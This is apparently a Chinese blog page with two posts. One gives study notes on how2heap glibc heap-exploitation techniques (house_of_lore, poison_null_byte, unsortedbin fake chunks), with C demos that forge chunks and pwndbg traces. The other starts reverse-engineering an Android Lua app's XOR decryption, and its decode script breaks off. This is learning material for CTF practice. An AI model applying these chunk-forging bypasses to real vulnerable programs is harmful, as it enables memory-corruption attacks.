<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602058</span><br><span class="line">0x602058:	0x0000000000000000	0x00007ffff7dd2540</span><br><span class="line">0x602068 &lt;completed.7594&gt;:	0x0000000000000000	0x0000000000602058</span><br></pre></td></tr></table></figure>

<p>要注意 chunk0_ptr 此时地址为 0x602070 ,我们可以修改指针的指向以达到任意写的目的,可以看看如下的小 demo</p>
<blockquote>
<p>最后的赋值修改,类似如此</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">uint64_t  *chunk0_ptr;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char b[8]=&quot;aaaa&quot;;</span><br><span class="line">	chunk0_ptr=&amp;b;</span><br><span class="line">	chunk0_ptr[0] = 0x4242424242424242LL;</span><br><span class="line">	printf(&quot;%s\n&quot;,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;13:40&#125;~/桌面 ➭ gcc te.c</span><br><span class="line">te.c: In function ‘main’:</span><br><span class="line">te.c:10:12: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]</span><br><span class="line">  chunk0_ptr=&amp;b;</span><br><span class="line">            ^</span><br><span class="line">&#123;13:40&#125;~/桌面 ➭ ./a.out </span><br><span class="line">BBBBBBBB</span><br></pre></td></tr></table></figure>


<p>接上篇.上一篇见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6437">这里</a> (虽然两篇联系不大).这篇出现的小 demo ,都可以直接调试,供大家参考</p>
<h2 id="困惑我的-small-bin-的源码"><a href="#困惑我的-small-bin-的源码" class="headerlink" title="困惑我的 small bin 的源码"></a>困惑我的 small bin 的源码</h2><p>做 house_of_lore 时,我在看源码时我遇到了一个很费解的问题(注释来自 ctf-wiki)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    // 获取 small bin 的索引</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    // 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    // 如果 victim = bin ，那说明该 bin 为空。</span><br><span class="line">    // 如果不相等，那么会有两种情况</span><br><span class="line">    if ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        // 第一种情况，small bin 还没有初始化。</span><br><span class="line">        if (victim == 0) /* initialization check */</span><br><span class="line">            // 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        // 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            // 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            // 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            // 如果不是 main_arena，设置对应的标志</span><br><span class="line">            if (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            // 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            // 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p = chunk2mem(victim);</span><br><span class="line">            // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>bck = victim-&gt;bk;</code>把我整蒙了.ei??既然找到最后一个( victim ),那倒数第二个不就应该是 victim-&gt;fd 吗??怎么是找 victim-&gt;bk 呢.事实上,这就要考虑到 smallbins 的 FIFO (先进先出)原则,在本程序中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx victim-2</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x602010:	0x00007ffff7dd1bd8	0x00007fffffffddf0</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; p stack_buffer_1</span><br><span class="line">$1 = &#123;0x0, 0x0, 0x602000, 0x7fffffffddd0&#125;</span><br><span class="line">pwndbg&gt; p stack_buffer_2</span><br><span class="line">$2 = &#123;0x0, 0x0, 0x7fffffffddf0&#125;</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_1</span><br><span class="line">$3 = (intptr_t *(*)[4]) 0x7fffffffddf0</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_2</span><br><span class="line">$4 = (intptr_t *(*)[3]) 0x7fffffffddd0</span><br></pre></td></tr></table></figure>
<p>通过构造情况我们画一下图(表格)</p>
<table>
<thead>
<tr>
<th align="center">victim_hdr</th>
<th align="center">pre_size</th>
<th align="center">size</th>
</tr>
</thead>
<tbody><tr>
<td align="center">victim_ptr</td>
<td align="center">fd</td>
<td align="center">&amp;stack_buffer_1_hdr</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">stack_buffer_1_hdr</td>
<td align="center">pre_size</td>
<td align="center">size</td>
</tr>
<tr>
<td align="center">stack_buffer_1_ptr</td>
<td align="center">&amp;victim_hdr</td>
<td align="center">&amp;stack_buffer_2_hdr</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">stack_buffer_2_hdr</td>
<td align="center">pre_size</td>
<td align="center">size</td>
</tr>
<tr>
<td align="center">stack_buffer_2_ptr</td>
<td align="center">&amp;stack_buffer_1_hdr</td>
<td align="center">bk</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">…</td>
</tr>
</tbody></table>
<p>所谓的最后一个其实是 victim_hdr (我们伪造的链是从后向前伪造的),关键满足的 bypass 条件便是 <code>chunk-&gt;bk-&gt;fd==chunk</code> 即可,程序第一次 malloc(p3) 的时候是最后一个即 0x602010 要验证的便是 <code>victim-&gt;bk-&gt;fd==victim</code> ,把程序具体变量放进去就是 <code>stack_buffer_1-&gt;fd==victim</code> .同理,之后的 malloc(p4) 便是 <code>stack_buffer_2-&gt;fd==stack_buffer_1</code> ,确实成立后自然就 malloc 出来了</p>
<h2 id="关于-poison-null-byte-的思考"><a href="#关于-poison-null-byte-的思考" class="headerlink" title="关于 poison_null_byte 的思考"></a>关于 poison_null_byte 的思考</h2><p>做这个的时候我感觉这个 bypass 条件有点过于简单,既然条件为  <code>prev_size(nextchunk(P))==chunksize(P)</code> ,只要能够利用溢出修改 chunksize(P) ,我们的 prev_size(nextchunk(P)) 也是由我们控制的,那我在下方任意一处伪造一个 fake_nextchunk 不就行了吗??测试程序如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	uint8_t* a = (uint8_t*) malloc(1);</span><br><span class="line">	int real_a_size = malloc_usable_size(a);</span><br><span class="line">	void * B = malloc(0x150);</span><br><span class="line">	void * C = malloc(0x150);</span><br><span class="line">	malloc(0x10);</span><br><span class="line">	free(B);</span><br><span class="line">	a[real_a_size] = 0x40;</span><br><span class="line">	*(size_t*)(B+0x130) = 0x140;</span><br><span class="line">	void * D = malloc(0x80);</span><br><span class="line">	void * E = malloc(0x10);</span><br><span class="line">	free(D);</span><br><span class="line">	free(C);</span><br><span class="line">	C = malloc(0x2b0);</span><br><span class="line">	D = malloc(0x90);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到,我在<code>a[real_a_size] = 0x40;</code>和<code>*(size_t*)(B+0x130) = 0x140;</code>构造了和 poison_null_byte 一样的条件.断在 malloc(D) 之前,让程序跑起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x602160:	0x0000000000000140	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602180:	0x0000000000000160	0x0000000000000160</span><br><span class="line">0x602190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; p C</span><br><span class="line">$3 = (void *) 0x602190</span><br></pre></td></tr></table></figure>

<p>之后在 n 单步运行,发现程序果真修改的是我们伪造的 0x602160 处的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602160:	0x00000000000000b0	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602180:	0x0000000000000160	0x0000000000000160</span><br></pre></td></tr></table></figure>

<p>事实上,把 prev_size(nextchunk(P)) 改到 C 的下方也是可以的(修改一下上方程序调试一下).所以结论便是:修改的 0x602160 ( prev_size(nextchunk(P)) )是通过现在的 B 的 size 找到的,然而在 free(D) 和 free(C) 后 chunk 之间的合并竟然利用的是 C 的 pre_size 来找到的之前的 B (虽然听上去很矛盾,但是 pre_size 设计出来的目的确实是如此,参见<a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/10/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8A/">此处</a>).所以只要不修改 real_c_presize 无论如何都是能够完成 chunk 的合并的.</p>
<p>其实通过这个 bypass 还可以挖掘一些骚操作,比如通过把 chunksize(P) 改大(要求有溢出漏洞)我们甚至可以通过切割 unsortedbin 的方式获得一个新的 ptr_c ,用来完成一个变向的 UAF 等等</p>
<h2 id="about-unsortedbin"><a href="#about-unsortedbin" class="headerlink" title="about unsortedbin"></a>about unsortedbin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  intptr_t stack_buffer[4] = &#123;0&#125;;</span><br><span class="line">  intptr_t stack_buffer_1[4] = &#123;0&#125;;</span><br><span class="line">  intptr_t* victim = malloc(0x100);</span><br><span class="line">  intptr_t* p1 = malloc(0x100);</span><br><span class="line">  free(victim);</span><br><span class="line">  stack_buffer[1] = 0x110;</span><br><span class="line">  stack_buffer[3] = (intptr_t)stack_buffer_1;</span><br><span class="line">  stack_buffer_1[1] = 0x100 + 0x10;</span><br><span class="line">  stack_buffer_1[3] = (intptr_t)stack_buffer_1;</span><br><span class="line">  victim[-1] = 32;</span><br><span class="line">  victim[1] = (intptr_t)stack_buffer;</span><br><span class="line">  fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, malloc(0x100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了加深理解,我写了一个这样的小 demo ,可以看到,我故意把链加长了,有一个 check 我们需要注意一下,即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;);</span><br></pre></td></tr></table></figure>

<p>大小必须让它和下一个要求的不同,且大于 2*SIZE_SZ ,同时还必须小于已分配内存的大小.好,我们让程序跑起来,断在最后一个 malloc(0x100) 处.尽管 stack_buffer 和 stack_buffer_1 差不多,但是程序在 malloc(0x100) 的时候还是会选择 stack_buffer </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx stack_buffer</span><br><span class="line">0x7fffffffddd0:	0x0000000000000000	0x0000000000000110		----stack_buffer</span><br><span class="line">0x7fffffffdde0:	0x0000000000000000	0x00007fffffffddf0</span><br><span class="line">0x7fffffffddf0:	0x0000000000000000	0x0000000000000110		----stack_buffer_1</span><br><span class="line">0x7fffffffde00:	0x0000000000000000	0x00007fffffffddf0</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">malloc(0x100): 0x7fffffffdde0</span><br></pre></td></tr></table></figure>

<p>然而当把 <code>stack_buffer[1] = 0x110;</code> 中的 0x110 改成别的,这时候再 malloc(0x100) 才会使用我们之后构造的 stack_buffer_1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">11	  stack_buffer[1] = 0x100;		--------修改为 0x100</span><br><span class="line">12	  stack_buffer[3] = (intptr_t)stack_buffer_1;</span><br><span class="line">13	  stack_buffer_1[1] = 0x110;</span><br><span class="line">14	  stack_buffer_1[3] = (intptr_t)stack_buffer_1;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx stack_buffer</span><br><span class="line">0x7fffffffddd0:	0x0000000000000000	0x0000000000000100</span><br><span class="line">0x7fffffffdde0:	0x0000000000000000	0x00007fffffffddf0</span><br><span class="line">0x7fffffffddf0:	0x0000000000000000	0x0000000000000110</span><br><span class="line">0x7fffffffde00:	0x0000000000000000	0x00007fffffffddf0</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">malloc(0x100): 0x7fffffffde00</span><br></pre></td></tr></table></figure>

<p>同时经过遍历的 stack_buffer 和一开始真的 chunk 即 victim 也因为能力不足(上篇中形象的概念),跑到了 smallbins.当然能能不能用另说,2333</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">BK: 0x7fffffffddf0 ◂— 0x7fffffffddf0</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">0x100: 0x7fffffffddd0 —▸ 0x7ffff7dd1c68 (main_arena+328) ◂— 0x7fffffffddd0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>所以 unsortedbin 是从头开始遍历,途中遇到的能力不足的 unsortedbin 都会被安排到对应的 bins 中,而一旦有合适的就停止遍历并使用,为什么说是停止遍历呢??可以调试一下一开始的程序,看程序在最后一个 malloc(0x100) 之后的 bins</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">BK: 0x7fffffffddf0 ◂— 0x7fffffffddf0</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>相当于只把一开始的 victim 给并入了 smallbins ,而 stack_buffer_1 还是待在 unsortedbin 中</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>剩下的一些问题,在网上各位师傅的分析中已经很明了了.本篇的初衷就是扣一些易犯的错和问题,越是遇到难的诸如 <code>house of orange</code> 等问题大家就越深入分析,本篇也就不再谈了(而且感觉自己也不能表达的很清楚). how2heap 中的大部分都是欺骗系统的一系列 bypass 和构造,提升的方式就是做题和看源码了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/09/29/2019-09-27-how2heap/" data-id="cuidi1VNqIATjxyZuKJJT_NCb" data-title="how2heap" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-09-27-lua_1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/09/27/2019-09-27-lua_1/" class="article-date">
  <time class="dt-published" datetime="2019-09-26T16:00:00.000Z" itemprop="datePublished">2019-09-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/09/27/2019-09-27-lua_1/">Mysterious app</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本次记录一下本菜鸡小小的分析这个<strong>送给最好的TA</strong></p>
<p>我是直接暴力把 apk 后缀改成 zip 后打开的，没想到大佬们可以发现这个<a target="_blank" rel="noopener" href="http://www.javadecompilers.com/">神奇的网站</a>进行拆包，学到了，但是要关闭屏蔽广告的插件，毕竟不能靠爱发电</p>
<p>然后我就开始研究 classes.dex 源码了，先把 dex 转成 jar ，然后用jd-gui一顿 xjb 分析，大致看了一下有一个获取路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public String getLuaPath()</span><br><span class="line">&#123;</span><br><span class="line">  initMain();</span><br><span class="line">  StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">  localStringBuilder.append(getLocalDir());</span><br><span class="line">  localStringBuilder.append(&quot;/main.lua&quot;);</span><br><span class="line">  return localStringBuilder.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用到了 lua ~~~ ，程序对 lua 进行加载和解密，进入<code>com\androlua\LuaActivity.class</code>,一个<code>public Object loadLib(String paramString)</code>使用 jni 加载 so 文件，之后就开始了 so 文件的排查解密函数</p>
<p>我目前的思路就是通过排查 so 进而解出 main.lua 了，如果 main.lua 没什么问题就是 java 写的了</p>
<p>通过几个关键函数如<code>luaL_loadstring</code>,我们最终定位到了<code>j_luaL_loadbufferx</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall luaL_loadbufferx(int a1, int a2, size_t size, int a4, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  int v5; // r10</span><br><span class="line">  size_t v6; // r6</span><br><span class="line">  int v7; // r11</span><br><span class="line">  int v8; // r8</span><br><span class="line">  _BYTE *v9; // r0</span><br><span class="line">  int v10; // r1</span><br><span class="line">  signed int v11; // r2</span><br><span class="line">  _BYTE *v13; // [sp+8h] [bp-28h]</span><br><span class="line">  size_t v14; // [sp+Ch] [bp-24h]</span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v6 = size;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = a4;</span><br><span class="line">  v13 = (_BYTE *)a2;</span><br><span class="line">  v14 = size;</span><br><span class="line">  if ( *(_BYTE *)a2 == 27 &amp;&amp; *(_BYTE *)(a2 + 1) != 76 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = malloc(size);</span><br><span class="line">    if ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v9 = 27;</span><br><span class="line">      if ( v6 != 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = 0;</span><br><span class="line">        v11 = 1;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v10 += v6;</span><br><span class="line">          v9[v11] = *(_BYTE *)(v7 + v11) ^ (v10</span><br><span class="line">                                          + ((unsigned int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &gt;&gt; 7)</span><br><span class="line">                                          + ((signed int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &lt; 0));</span><br><span class="line">          ++v11;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v6 != v11 );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  return ((int (__fastcall *)(int, int (*)(), _BYTE **, int, int))j_lua_load)(v5, sub_E6AA, &amp;v13, v8, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现逻辑其实十分清晰，只有一行关键加密，我们把文件加载进来，然后顺着整个脚本就能把 lua 解密成字节码形式了，卧槽，看见大佬直接 dump 出来了，真是orz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v9[v11] = *(_BYTE *)(v7 + v11) ^ (v10</span><br><span class="line">                                          + ((unsigned int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &gt;&gt; 7)</span><br><span class="line">                                          + ((signed int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &lt; 0));</span><br></pre></td></tr></table></figure>

<p>其中<code>v11</code>为下标，<code>v6 = size;</code>，<code>v9</code>则为原字节，下面就得想了，之前 a2 把值赋给了 v7 ，同时判断 a2&#x3D;&#x3D;27 ，我们断定这只能是原字节，然后剩下的就能写出脚本了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">uint8_t *decode(uint8_t *data, int size) &#123;</span><br><span class="line">        uint8_t *real = malloc(size);</span><br><span class="line">        *real = 27;</span><br><span class="line">        v10 = 0;</span><br><span class="line">        v11 = 1;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v10 += size;</span><br><span class="line">          real[v11] = date[v11] ^ (v10</span><br><span class="line">                                          + ((unsigned int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &gt;&gt; 7)</span><br><span class="line">                                          + ((signed int)(((unsigned __int64)(-2139062143LL * v10) &gt;&gt; 32) + v10) &lt; 0));</span><br><span class="line">          ++v11;</span><br><span class="line">         &#125;</span><br><span class="line">         while ( size != v11 );</span><br><span class="line">         return real;</span><br></pre></td></tr></table></figure>

